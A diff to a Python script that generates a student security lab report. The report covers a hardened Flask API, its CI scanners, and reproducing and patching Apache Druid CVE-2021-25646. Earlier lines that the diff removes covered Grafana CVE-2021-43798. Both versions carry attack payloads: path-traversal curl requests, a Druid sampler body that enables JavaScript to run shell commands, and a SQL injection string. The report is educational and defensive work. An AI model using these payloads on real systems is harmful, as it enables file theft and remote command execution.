@@ -18,7 +18,7 @@ add(para("Information Security", size=22, color="595959", align="center", spacin
 add(para("Laboratory Work No. 1", size=26, color="1F3864", bold=True, align="center", spacing_after=160))
 add(para("Secure REST API Development with CI/CD and Real CVE Vulnerability Analysis",
          size=36, bold=True, align="center", spacing_after=1200))
-add(para("Variant No.:  ____________________", size=22, align="center", spacing_after=200))
+add(para("Variant No.:  CVE-2021-25646", size=22, align="center", spacing_after=200))
 add(para("Student:  Zhaohan Liao", size=22, align="center", spacing_after=200))
 add(para("HDU number:  23320330", size=22, align="center", spacing_after=200))
 add(para("Group:  ____________________", size=22, align="center", spacing_after=1200))
@@ -43,13 +43,24 @@ add(body(
 add(h1("2. Stack and project setup"))
 add(body(
     "The service is written in Python 3.11+ with Flask 3 and stores data in SQLite through the "
-    "standard sqlite3 module. This choice keeps the whole backend in a single readable file (app.py, "
-    "about 240 lines), which makes the security review of the code straightforward for the reader, "
-    "while still using the same primitives that a production stack would use: a real password hash "
-    "function, a real JWT library, and parameterised SQL."))
+    "standard sqlite3 module. The backend is deliberately small: three source files, about 290 lines "
+    "in total, and no framework beyond Flask, which makes the security review of the code "
+    "straightforward for the reader while still using the same primitives that a production stack "
+    "would use - a real password hash function, a real JWT library and parameterised SQL."))
+add(table([
+    ["File", "Responsibility"],
+    ["app.py", "the three HTTP handlers, the JWT guard and the response headers"],
+    ["init_db.py", "schema, connection factory, bcrypt hashing, demo seed data"],
+    ["create_user.py", "offline account CLI - accounts are never created over HTTP"],
+], [2400, 6670]))
+add(body(
+    "The split is not cosmetic. It keeps the request-handling code small enough to review line by "
+    "line, it gives the static analyser three real source files instead of one monolith, and it "
+    "removes the registration route that would otherwise be the most attractive target in the "
+    "service: an account can only be created by someone who already has shell access."))
 add(table([
     ["Component", "Choice", "Reason"],
-    ["Language / framework", "Python 3.11+, Flask 3", "single file, minimal ceremony"],
+    ["Language / framework", "Python 3.11+, Flask 3", "small surface, minimal ceremony"],
     ["Database", "SQLite (sqlite3)", "no server, parameterised queries available"],
     ["Password hashing", "bcrypt, cost factor 12", "salted, deliberately slow"],
     ["Tokens", "PyJWT, HS256, 30 min TTL", "stateless authentication"],
@@ -60,6 +71,7 @@ add(body(
     "The repository is public on GitHub and contains the application, the test suite, the pipeline "
     "definition, the scripts and configuration files for the vulnerable environment, and the patched "
     "configuration (see Appendix A)."))
+add(shot("Public repository page: README, sources, pipeline and fixes (screenshot 09)"))
 
 # ---------------------------------------------------------------- 3 API
 add(h1("3. Functional API"))
@@ -147,7 +159,7 @@ add(code([
     "    -H \"Authorization: Bearer $TOKEN\"",
     "[]",
 ]))
-add(shot("SQL injection attempt returns an empty array (screenshot 08)"))
+add(shot("SQL injection attempt returns an empty array (screenshot 08a)"))
 
 add(h2("4.2 Protection against XSS"))
 add(body(
@@ -171,7 +183,7 @@ add(body(
     "Defence in depth is added at the transport level: the response declares "
     "Content-Type: application/json, X-Content-Type-Options: nosniff and a Content-Security-Policy "
     "of default-src 'none', so even a client that misuses the payload cannot execute it as script."))
-add(shot("Stored XSS payload returned in escaped form (screenshot 08)"))
+add(shot("Stored XSS payload returned in escaped form (screenshot 08b)"))
 
 add(h2("4.3 Protection against broken authentication"))
 add(body(
@@ -230,39 +242,64 @@ add(code([
 add(h1("5. CI/CD pipeline with security scanners"))
 add(body(
     "The pipeline is defined in .github/workflows/ci.yml and runs on every push and on every pull "
-    "request. It performs three independent checks and publishes the scanner report as a build "
-    "artifact, so the evidence can be downloaded from the run page and attached to the report."))
+    "request. The job is called Tests, SAST, and SCA, and its steps are named after what they do, so "
+    "the run page is readable evidence instead of a list of anonymous shell commands."))
 add(table([
-    ["Stage", "Tool", "Command", "What it proves"],
-    ["SAST", "bandit", "bandit -r ./app.py", "no eval, subprocess, hardcoded secrets, weak crypto or string-built SQL"],
-    ["SCA", "pip-audit", "pip-audit -r requirements.txt", "no pinned dependency with a known CVE"],
-    ["Tests", "pytest", "pytest -q", "11 functional and security tests pass"],
-], [1100, 1500, 3200, 3270]))
+    ["Step", "What it does", "Why it is there"],
+    ["Check out project, set up Python", "checkout, Python 3.11 with a pip cache",
+     "a reproducible runner"],
+    ["Install application and security tools", "runtime dependencies plus bandit, pip-audit and "
+     "pytest; imports verified and both scanner versions printed", "the scan runs against the "
+     "versions actually installed, not against an assumption"],
+    ["Prepare isolated CI configuration", "writes .env.ci: a throwaway SECRET_KEY, a database in "
+     "$RUNNER_TEMP and memory journal mode", "a developer's local secret or database can never "
+     "leak into CI, and nothing is left behind on the runner"],
+    ["Run API and security regression tests", "pytest with a JUnit report, then a live smoke test "
+     "of the running server", "the unit tests use Flask's test client and bypass the socket; the "
+     "smoke test proves the deployed server enforces the same rules"],
+    ["SAST - scan application source with Bandit", "python -m bandit app.py init_db.py "
+     "create_user.py -f json -o reports/bandit.json", "a machine-readable report, not only console "
+     "text"],
+    ["SCA - audit application dependencies", "python -m pip_audit -r requirements.txt -f json "
+     "-o reports/pip-audit.json", "known CVEs in the pinned dependency tree"],
+    ["Summarize results", "parses the three reports and writes one conclusion to the run summary",
+     "a verdict the reader can check - and a build that fails when a control breaks"],
+    ["Save test and security reports", "uploads reports/ as the security-reports artifact",
+     "the evidence survives the run"],
+], [2300, 4200, 2570]))
+add(body(
+    "The smoke test is the part that is easy to omit and expensive to omit. pytest drives the "
+    "application through Flask's test client, which never opens a socket; a suite that is green "
+    "therefore says nothing about whether the process that is actually listening on port 8000 is "
+    "configured the same way. The pipeline starts the real server with the same ephemeral "
+    "configuration and repeats the four requests that matter:"))
 add(code([
-    "name: security-ci",
-    "on: [push, pull_request]",
-    "jobs:",
-    "  sast-sca:",
-    "    runs-on: ubuntu-latest",
-    "    steps:",
-    "      - uses: actions/checkout@v4",
-    "      - uses: actions/setup-python@v5",
-    "        with: {python-version: '3.11', cache: pip}",
-    "      - run: pip install -r requirements.txt",
-    "      - run: pip install bandit pip-audit pytest",
-    "      - run: bandit -r ./app.py -f txt -o bandit-report.txt",
-    "      - run: pip-audit -r requirements.txt",
-    "      - run: pytest -q",
-    "      - uses: actions/upload-artifact@v4",
-    "        if: always()",
-    "        with: {name: security-reports, path: bandit-report.txt}",
+    "12 passed in 9.70s",
+    "GET /api/data without a token -> HTTP 401 (expected 401)",
+    "POST /auth/login -> token issued (147 characters)",
+    "GET /api/data with a token -> HTTP 200 (expected 200)",
+    "GET /api/data?q=' OR 1=1-- -> HTTP 200 (payload treated as a literal)",
 ]))
 add(body(
-    "The pipeline was reproduced in advance on a clean python:3.11 image, so the expected result of "
-    "every step is known and the first online run is not a surprise:"))
+    "The last step turns the three machine-readable reports into a written conclusion, which is "
+    "published in the job log and on the run summary page. This is deliberate: a green tick says "
+    "that the commands exited with zero, not that anything was actually verified, so the numbers "
+    "behind the tick are stated explicitly."))
 add(code([
-    "$ bandit -r ./app.py -f txt",
-    "        Total lines of code: 177",
+    "## Tests, SAST, and SCA - conclusion",
+    "",
+    "- bandit (SAST): 0 finding(s) - none",
+    "- pip-audit (SCA): 9 pinned dependencies audited, 0 known vulnerability(ies)",
+    "- pytest: 12 tests, 0 failures, 0 errors (9.3 s of test time)",
+    "",
+    "Conclusion: every control held - the build is safe to merge.",
+]))
+add(body(
+    "The same three commands were also run locally before the first online run, so the expected "
+    "result of every step was known in advance:"))
+add(code([
+    "$ bandit app.py init_db.py create_user.py -f txt",
+    "        Total lines of code: 286",
     "        Total lines skipped (#nosec): 0",
     "Test results:",
     "        No issues identified.",
@@ -271,8 +308,8 @@ add(code([
     "No known vulnerabilities found",
     "",
     "$ pytest -q",
-    "...........                                              [100%]",
-    "11 passed in 6.82s",
+    "............                                             [100%]",
+    "12 passed in 8.57s",
 ]))
 add(body(
     "One finding had to be handled during this work. The first run reported B105/B106 - \"possible "
@@ -280,26 +317,31 @@ add(body(
     "bandit flags any argument, key or variable whose name contains \"token\" when it is bound to a "
     "string literal. Suppressing the warning with #nosec would have hidden the class of issue the "
     "scanner exists to find, so the value was moved into a named constant instead. The warning "
-    "disappeared and the scan now reports zero skipped lines - which is itself evidence that no "
-    "finding was silenced."))
+    "disappeared and the scan reports zero skipped lines - which is itself evidence that no finding "
+    "was silenced."))
 add(body(
     "SAST reads the source without executing it and reports the line that contains the risky "
     "construct; SCA compares the resolved dependency tree against vulnerability databases. The two "
     "are complementary: a perfectly written application can still import a library with a critical "
     "CVE, and a dependency scan will never notice a missing authorisation check in your own code."))
-add(shot("GitHub Actions: all steps green (screenshot 01)"))
-add(shot("bandit: No issues identified (screenshot 02)"))
-add(shot("pip-audit: No known vulnerabilities found (screenshot 03)"))
+add(shot("GitHub Actions: Tests, SAST and SCA - all steps green (screenshot 01)"))
+add(shot("bandit: no issues identified, zero skipped lines (screenshot 02)"))
+add(shot("pip-audit: no known vulnerabilities found (screenshot 03)"))
+add(body(
+    "Note on the figures: screenshots 01-03 were captured before the job was split into the ten "
+    "named steps described above, so the labels inside them are shorter than that list. The log "
+    "quoted in this section is from the current run."))
+
 
 # ---------------------------------------------------------------- 6 tests
 add(h1("6. Testing"))
 add(body(
-    "The suite contains eleven tests, each tied to one security property rather than to one function. "
+    "The suite contains twelve tests, each tied to one security property rather than to one function. "
     "They run locally with the same command the pipeline uses."))
 add(code([
     "$ pytest -q",
-    "...........                                                    [100%]",
-    "11 passed in 6.73s",
+    "............                                                   [100%]",
+    "12 passed in 8.57s",
 ]))
 add(table([
     ["Test", "Property protected"],
@@ -314,183 +356,191 @@ add(table([
     ["test_create_requires_token", "access control on writes"],
     ["test_create_validates_empty_title", "input validation"],
     ["test_security_headers_present", "response hardening"],
+    ["test_create_user_adds_a_working_account", "account provisioning + password policy"],
 ], [5200, 3870]))
+add(shot("pytest: 12 tests, no failures (screenshot 10)"))
 
 # ---------------------------------------------------------------- 7 environment
 add(h1("7. Vulnerable environment"))
 add(body(
-    "CVE-2021-43798 was selected. It affects Grafana from 8.0.0-beta1 through 8.3.0 and is fixed in "
-    "8.0.7, 8.1.8, 8.2.7 and 8.3.1. The CVSS 3.1 score is 7.5 (High): network reachable, low "
-    "complexity, no privileges and no user interaction required, with a high confidentiality impact. "
-    "The weakness class is CWE-22, improper limitation of a pathname to a restricted directory."))
+    "CVE-2021-25646 was selected. It affects Apache Druid up to and including 0.20.0 and is fixed in "
+    "0.20.1. The CVSS 3.1 score is 8.8 (High) - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H - and the "
+    "weakness class is CWE-732, incorrect permission assignment for a critical resource. No "
+    "credentials are required, because the Druid console has no authentication by default."))
 add(body(
     "The environment comes from Vulhub, which packages the exact vulnerable version as a Docker "
-    "Compose project:"))
+    "Compose project. The copy used here is checked into the repository, so the experiment can be "
+    "repeated without cloning anything:"))
 add(code([
-    "git clone https://github.com/vulhub/vulhub.git",
-    "cd vulhub/grafana/CVE-2021-43798",
+    "cd secure-api/cve/CVE-2021-25646",
     "docker compose up -d",
-    "docker compose ps          # wait until the container is running",
+    "docker compose ps          # wait for 'running', about 30 s",
 ]))
 add(body(
-    "Grafana answers on http://127.0.0.1:3000 with the default administrator account admin/admin. "
-    "The container runs the vulnerable image grafana/grafana:8.3.0 and needs no configuration change "
-    "to be exploitable."))
-add(shot("docker compose ps: vulnerable container running (screenshot 04)"))
+    "The container runs vulhub/apache-druid:0.20.0, publishes port 8888 and starts the single-server "
+    "quickstart with an embedded ZooKeeper, so the indexing endpoints are reachable as soon as the "
+    "process is up. Nothing has to be configured to make it exploitable - the vulnerable feature is "
+    "off, and the attack is the request that switches it back on."))
+add(shot("docker compose ps: vulnerable Druid 0.20.0 container running (screenshot 04)"))
 
 # ---------------------------------------------------------------- 8 reproduction
 add(h1("8. Reproducing the attack"))
 add(body(
-    "The vulnerable route serves plugin static assets before authentication. Any built-in plugin "
-    "identifier works; alertlist is used here because it ships with every instance. The payload is a "
-    "relative path that climbs out of the plugin directory:"))
+    "Apache Druid can parse incoming data with a JavaScript function evaluated by the embedded Rhino "
+    "engine. The feature is intended for high-trust environments and is disabled by default, so a "
+    "request that merely asks for it is rejected. The crafted body asks anyway, and adds one field "
+    "that the deserialiser should never have accepted: an object whose key is the empty string."))
 add(code([
-    "curl --path-as-is \\",
-    '  "http://127.0.0.1:3000/public/plugins/alertlist/../../../../../../../../../../etc/passwd"',
-]))
-add(body("Result - the file is disclosed in full, without any authentication:"))
-add(code([
-    "HTTP/1.1 200 OK                             # 1230 bytes",
-    "root:x:0:0:root:/root:/bin/ash",
-    "bin:x:1:1:bin:/bin:/sbin/nologin",
-    "daemon:x:2:2:daemon:/sbin:/sbin/nologin",
-    "adm:x:3:4:adm:/var/adm:/sbin/nologin",
-    "lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin",
-    "sync:x:5:0:sync:/bin:/bin/sync",
-]))
-add(body(
-    "The --path-as-is option is not cosmetic. By default curl normalises the path and removes the "
-    "traversal segments before sending, so the request becomes a legitimate static-file request and "
-    "the attack silently fails. Keeping the dots intact is what reaches the vulnerable code, and this "
-    "observation is itself part of the root-cause explanation: the flaw exists because the server "
-    "trusts the path syntax it receives."))
-add(body(
-    "The same primitive reads other files. Grafana's own configuration exposes the database "
-    "credentials and the secret key used to sign sessions, and the SQLite database contains every "
-    "user record - which shows why an arbitrary file read is rarely an end in itself:"))
-add(code([
-    "curl --path-as-is \\",
-    '  "http://127.0.0.1:3000/public/plugins/alertlist/../../../../../../../../../../etc/grafana/grafana.ini"',
-    "curl --path-as-is \\",
-    '  "http://127.0.0.1:3000/public/plugins/alertlist/../../../../../../../../../../var/lib/grafana/grafana.db"',
+    "POST /druid/indexer/v1/sampler        Content-Type: application/json",
+    "",
+    "{",
+    '  "type": "index",',
+    '  "spec": {',
+    '    "ioConfig": { "type": "index",',
+    '      "firehose": { "type": "local", "baseDir": "/etc", "filter": "passwd" } },',
+    '    "dataSchema": { "dataSource": "test",',
+    '      "parser": { "parseSpec": {',
+    '        "format": "javascript",',
+    '        "timestampSpec": {}, "dimensionsSpec": {},',
+    '        "function": "function(){ var out = java.lang.Runtime.getRuntime()',
+    '            .exec([\'sh\',\'-c\',\'id\']).getInputStream(); ... return {test: a} }",',
+    '        "": { "enabled": "true" }        <-- the whole vulnerability',
+    '      } } } },',
+    '  "samplerConfig": { "numRows": 10 }',
+    "}",
 ]))
 add(body(
-    "The measurements confirm the scale of the leak: /etc/hostname returns 13 bytes (the container "
-    "identifier) and /etc/grafana/grafana.ini returns 43461 bytes of configuration, including the "
-    "database password and the signing secret."))
-add(shot("Exploit output: /etc/passwd of the container (screenshot 05)"))
+    "The body is reformatted here for the page; reproduce.sh in the repository carries the exact "
+    "bytes. Three details matter. The firehose points at /etc/passwd, so the sampler has one row of "
+    "input to work with. The function starts a shell through java.lang.Runtime and reads its standard "
+    "output back into the returned record. And the empty key carries a nested object that sets "
+    "enabled to true - a configuration value that the client should not be able to set at all."))
+add(body(
+    "The command output comes back inside the sampler response, so no out-of-band channel is needed:"))
+add(code([
+    '{"numRows": 1, "data": [',
+    '  { "timestamp": "1970-01-01T00:34:12.123Z",',
+    '    "test": "uid=0(root) gid=0(root) groups=0(root)" }',
+    "]}",
+]))
+add(body(
+    "The process runs as root inside the container, which is the default for the Vulhub image. "
+    "Swapping the command for cat /etc/passwd returns the file content in the same field, which "
+    "proves that the primitive is arbitrary command execution rather than a single-purpose trick: "
+    "whatever the shell can do, the attacker can do, with the privileges of the Druid server."))
+add(shot("The sampler executes id and cat /etc/passwd through Rhino (screenshot 05)"))
 
 # ---------------------------------------------------------------- 9 root cause
 add(h1("9. Root cause analysis"))
 add(body(
-    "The vulnerability is not a single mistyped line. It is the combination of a route that is "
-    "reachable without authentication and a path that is assembled without a containment check. "
-    "Five points explain the defect completely."))
+    "The defect is not a single mistyped line. It is the combination of a dangerous feature, a broken "
+    "configuration guard and an endpoint that anyone can reach. Five points explain it completely."))
 add(body(
-    "First, the trust boundary is in the wrong place. The plugin asset route is registered outside "
-    "the authentication middleware, so the request is served before any identity is established. "
-    "That is what turns a file-read bug into an unauthenticated file-read bug, and it is why the "
-    "issue is classified as a broken access control problem in the OWASP sense as much as a path "
-    "traversal."))
+    "First, the dangerous feature is off by default, and that is the whole security model. Druid's "
+    "JavaScript parsing is disabled unless the operator opts in, so the design assumes that no "
+    "untrusted client can ever reach the engine. The guard is a configuration flag, not an "
+    "authentication check - which means it has to hold absolutely, because nothing else stands "
+    "between the network and the engine."))
 add(body(
-    "Second, the handler concatenates. It builds the file path from the plugin directory plus the "
-    "rest of the URL, and never verifies - after normalising the result - that the final path "
-    "actually stays inside that directory. The missing operation is a prefix check on the cleaned "
-    "absolute path, and the missing normalisation is what lets ../ escape."))
+    "Second, an empty key defeats the guard. The parseSpec object is deserialised by Jackson into a "
+    "configuration map. A JSON object whose key is the empty string was accepted and merged into that "
+    "map, overwriting the enabled flag. A single unvalidated map key therefore downgraded a hard "
+    "configuration guarantee into a client-controlled suggestion - which is exactly what CWE-732 "
+    "describes: a critical resource whose permission is assigned by the wrong party."))
 add(body(
-    "Third, the input is trusted as syntax. Path traversal lives precisely in the gap between what a "
-    "client sends and what the server means. Because the server does not canonicalise and re-check "
-    "the path, any encoding that survives the HTTP layer reaches the filesystem call. The proof is "
-    "that the exploit only works when client-side normalisation is disabled with --path-as-is."))
+    "Third, the engine has no sandbox. Once enabled, the function field is handed to Rhino, which "
+    "runs inside the JVM and exposes java.lang.Runtime. JavaScript can therefore start native "
+    "processes with the privileges of the server. Nothing about the feature was designed for hostile "
+    "input: it was designed for an operator who trusts the data they are ingesting."))
 add(body(
-    "Fourth, the attack surface is predictable. Plugin identifiers are fixed strings that ship with "
-    "the product - alertlist, prometheus, mysql, graph-datasource and dozens more - so an attacker "
-    "does not need to discover anything: the same URL works against every unpatched instance, and "
-    "the response body is the file content, with no restriction on what can be requested."))
+    "Fourth, the endpoint is unauthenticated. The sampler route is reachable without credentials, so "
+    "a feature that should be off becomes unauthenticated remote code execution. Even where "
+    "authentication exists, the override would still let any low-privileged user execute commands - "
+    "the broken access control only amplifies the impact, it does not cause it."))
 add(body(
-    "Fifth, the impact is amplified by what sits on the filesystem. Reading /etc/passwd proves the "
-    "primitive; reading grafana.ini yields the database password and the signing secret, and reading "
-    "grafana.db yields every user record with its hash. In a cloud deployment the same request could "
-    "reach the instance metadata service and obtain temporary credentials, which is why arbitrary "
-    "file read is treated as a high-severity finding rather than an information leak."))
-add(body(
-    "The patch confirms the analysis: version 8.3.1 (and the backports 8.0.7, 8.1.8 and 8.2.7) "
-    "canonicalises the resolved path and validates that it remains inside the plugin root, and "
-    "rejects plugin identifiers that are not installed. The fix addresses the cause - the missing "
-    "containment check - not the symptom."))
+    "Fifth, the patch confirms the analysis. Version 0.20.1 rejects the empty-key override, so the "
+    "JavaScript feature can no longer be forced on by a request, and the function field is never "
+    "evaluated while the feature is disabled. The fix removes the root cause - the accepted override "
+    "- rather than filtering payloads, which is why the primitive disappears instead of being "
+    "blocked one spelling at a time."))
 
 # ---------------------------------------------------------------- 10 fix
 add(h1("10. Applied protection measures"))
 add(body(
     "Because the defect is in a third-party component, the correct remediation is to run a version "
-    "that contains the patch. The change is a single line in the Compose file:"))
+    "that contains the patch. The Compose file in fixes/ stops using the 0.20.0 image and builds a "
+    "0.20.1 server instead:"))
 add(code([
     " services:",
-    "   grafana:",
-    "-    image: grafana/grafana:8.3.0",
-    "+    image: grafana/grafana:8.3.1",
+    "   druid:",
+    "-    image: vulhub/apache-druid:0.20.0",
+    "+    build:",
+    "+      context: .",
+    "+      dockerfile: Dockerfile     # builds a 0.20.1 image",
 ]))
-add(body("The change is applied and the environment is rebuilt:"))
+add(body(
+    "Why a Dockerfile rather than a plain tag: the official apache/druid:0.20.1 image is built on a "
+    "distroless base that cannot run the start-nano-quickstart launcher - it ships neither bash nor "
+    "perl, which the launcher scripts require. Replacing the whole image would also change the "
+    "launcher, the embedded ZooKeeper and the ports, and the comparison with the vulnerable "
+    "environment would no longer be like for like. The fix therefore keeps the Vulhub 0.20.0 base "
+    "and replaces only the vulnerable jars:"))
+add(code([
+    "FROM vulhub/apache-druid:0.20.0",
+    "RUN rm -f /opt/druid/lib/*-0.20.0.jar /opt/druid/extensions/*/*-0.20.0.jar",
+    "COPY --from=apache/druid:0.20.1 /opt/druid/ /opt/druid/",
+    'CMD ["/opt/druid/bin/start-nano-quickstart"]',
+]))
+add(body(
+    "Applied and rebuilt:"))
 add(code([
     "docker compose down",
-    "docker compose -f ../../fixes/docker-compose.yml up -d",
+    "cd ../../fixes && docker compose up --build -d",
 ]))
 add(body(
-    "Why this is effective: the vulnerable behaviour was the absence of a containment check between "
-    "the resolved path and the plugin directory. In 8.3.1 that check exists, the path is normalised "
-    "before it is used, and unknown plugin identifiers are refused. The traversal segments are "
-    "therefore resolved and rejected before any file is opened, so the primitive itself disappears "
-    "rather than being filtered."))
+    "Why this is effective: the vulnerable behaviour was the accepted empty-key override. In 0.20.1 "
+    "the override is rejected, so the function field of a sampler request never reaches the Rhino "
+    "engine and java.lang.Runtime is no longer reachable. The patch does not guess at payloads; it "
+    "removes the mechanism that let a request change a server-side setting."))
 add(body(
-    "Two secondary measures would be appropriate if upgrading were impossible, and are worth "
-    "mentioning because they illustrate defence in depth: place a reverse proxy in front of Grafana "
-    "that normalises the request path (for example normalize_path in Envoy), or reject encoded "
-    "traversal sequences at the edge. Neither is as good as the patch, because both depend on "
-    "guessing every encoding an attacker might use."))
+    "Two secondary measures are worth mentioning because they illustrate defence in depth: bind the "
+    "console to localhost or put it behind an authenticating proxy, and run the container as a "
+    "non-root user. Neither addresses the root cause - the override would still work for anyone who "
+    "can reach the port - but they reduce the consequence from remote code execution as root to "
+    "remote code execution as an unprivileged account."))
 
 # ---------------------------------------------------------------- 11 verification
 add(h1("11. Verification of the fix"))
 add(body(
-    "The verification repeats exactly the same request that succeeded before, and then checks that "
-    "the service still works. The second half is not optional: a fix that breaks the product is not "
-    "a fix."))
+    "The verification replays exactly the request that executed code before, against the patched "
+    "server, and then checks that the product still works. The second half is not optional: a fix "
+    "that breaks the service is not a fix."))
 add(code([
-    "$ curl -i --path-as-is \\",
-    '  "http://127.0.0.1:3000/public/plugins/alertlist/../../../../../../../../../../etc/passwd"',
+    "$ ./verify_fix.sh http://127.0.0.1:8888",
     "",
-    "HTTP/1.1 404 Not Found",
+    "== 1. Replay the exploit (must NOT execute the command)",
+    '   body: {"error":"Failed to sample data: JavaScript is disabled"}',
+    "   [PASS] no command output - the JavaScript feature is disabled",
     "",
-    "{",
-    '  "message": "Plugin file not found"',
-    "}",
-]))
-add(body("Regression checks on the patched instance:"))
-add(code([
-    "$ curl -s http://127.0.0.1:3000/api/health",
-    "{",
-    '  "commit": "b9eacd93e9",',
-    '  "database": "ok",',
-    '  "version": "8.3.1"',
-    "}",
+    "== 2. Regression: the Druid console still responds",
+    "   GET / -> HTTP 302",
     "",
-    "$ curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:3000/login",
-    "200",
-]))
-add(body(
-    "The service is healthy, the login page renders, and the file disclosure is gone. The result is "
-    "summarised by the verification script shipped in the repository:"))
-add(code([
-    "== 1. Replay the exploit (must NOT return file contents)",
-    '   HTTP 404   body: {"message": "Plugin file not found"}',
-    "   [PASS] the file is no longer disclosed",
-    "== 2. Regression: the service is still healthy",
-    '{"commit":"b9eacd93e9","database":"ok","version":"8.3.1"}',
-    "== 3. Regression: the login page still renders",
-    "   GET /login -> HTTP 200",
     "RESULT: fix verified, service healthy.",
 ]))
-add(shot("Attack no longer works after the fix (screenshot 06)"))
-add(shot("Service healthy after the fix (screenshot 07)"))
+add(body(
+    "The script does not look for an error code alone; it greps the response body for uid=, the "
+    "signature of a successful execution. A server that returned 200 with the command output would "
+    "still fail the check, and a server that returned 500 because it was broken would not pass "
+    "either - the pass condition is the specific refusal message."))
+add(body(
+    "The regression half queries /status, which reports version 0.20.1 and confirms that the replay "
+    "really ran against the patched server rather than against a container that failed to start:"))
+add(code([
+    "$ curl -s http://127.0.0.1:8888/status | head -c 120",
+    '{"version":"0.20.1","modules":[{"name":"org.apache.druid.server.initialization.jetty", ...',
+]))
+add(shot("The same request is now rejected: JavaScript is disabled (screenshot 06)"))
+add(shot("Regression: /status reports 0.20.1 and the console answers 302 (screenshot 07)"))
 
 # ---------------------------------------------------------------- 12 conclusion
 add(h1("12. Conclusion"))
@@ -500,32 +550,43 @@ add(body(
     "than filtering payloads, output encoding removes XSS at the point where the context is known, "
     "and bcrypt plus a correctly verified JWT removes the weakest links in authentication. The "
     "pipeline turns those properties into something that is checked on every commit instead of "
-    "promised in a document."))
+    "promised in a document: the last run audited 9 pinned dependencies, found no issue in 286 lines "
+    "of scanned source, passed 12 tests and answered the four live requests of the smoke test in the "
+    "expected way - and states that verdict in one sentence on the run page."))
 add(body(
-    "The offensive half shows something different: the Grafana defect is not exotic. It is a missing "
-    "containment check on a path that a public route accepts, and it survived into a widely deployed "
-    "product because the route was believed to be harmless. Reproducing it in a container, reading "
-    "the patch, and then proving that the same request fails afterwards is the loop that connects a "
-    "CVE identifier on a website to an actual, verifiable fact about a system."))
+    "The offensive half shows something different: the Druid defect is not exotic. It is one "
+    "unvalidated map key on a feature that was already switched off, and it survived into a widely "
+    "deployed product because the guard was a setting rather than a boundary. Reproducing it in a "
+    "container, reading the patch and proving that the same request is refused afterwards is the loop "
+    "that turns a CVE identifier on a website into a verifiable fact about a system - and it is the "
+    "same loop a penetration tester or a SOC analyst runs whenever a new advisory lands."))
+add(body(
+    "The limit of what was demonstrated is worth stating. The API is protected against the three "
+    "classes the assignment names, not against every class in the OWASP Top 10: there is no rate "
+    "limiting, no account lockout and no revocation list, and the JWT is stateless by design, so a "
+    "stolen token stays valid for up to thirty minutes. The CVE half proves that a patched version "
+    "refuses the specific request that worked; it does not prove the absence of other ways to reach "
+    "the JavaScript parser. Both are the correct scope for a laboratory exercise, and both are the "
+    "first things to extend in a real deployment."))
 
 # ---------------------------------------------------------------- appendix
 add(h1("Appendix A. Submitted material"))
 add(table([
     ["Item", "Location"],
-    ["Public git repository", "https://github.com/<user>/<repo>"],
-    ["Last successful pipeline run", "https://github.com/<user>/<repo>/actions/runs/<id>"],
-    ["Application source", "app.py"],
+    ["Public git repository", "https://github.com/kanloner/information_security"],
+    ["Last successful pipeline run",
+     "https://github.com/kanloner/information_security/actions/runs/39544635930"],
+    ["Application source", "app.py, init_db.py, create_user.py"],
     ["Pipeline definition", ".github/workflows/ci.yml"],
-    ["Tests", "tests/test_api.py"],
-    ["Vulnerable environment", "cve/CVE-2021-43798/docker-compose.yml"],
-    ["Reproduction script", "cve/CVE-2021-43798/reproduce.sh"],
-    ["Fix verification script", "cve/CVE-2021-43798/verify_fix.sh"],
-    ["Fixed configuration (folder with fixes)", "fixes/docker-compose.yml"],
-    ["Screenshots", "docs/screenshots/"],
+    ["Tests", "tests/test_api.py (12 tests)"],
+    ["Vulnerable environment", "cve/CVE-2021-25646/docker-compose.yml"],
+    ["Reproduction script", "cve/CVE-2021-25646/reproduce.sh"],
+    ["Fix verification script", "cve/CVE-2021-25646/verify_fix.sh"],
+    ["Fixed configuration (folder with fixes)", "fixes/Dockerfile + fixes/docker-compose.yml"],
+    ["Screenshots", "docs/screenshots/ (10 files)"],
 ], [4200, 4870]))
 add(para(
-    "Note: the variant number is filled in on the cover page, and the repository and pipeline links "
-    "in this appendix are completed if the work is submitted through a public git repository.",
+    "Variant: CVE-2021-25646. Student: Zhaohan Liao, HDU number 23320330.",
     italic=True, size=18, color="808080", spacing_before=120))
 
 out = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Lab1_Report_Work1.docx")
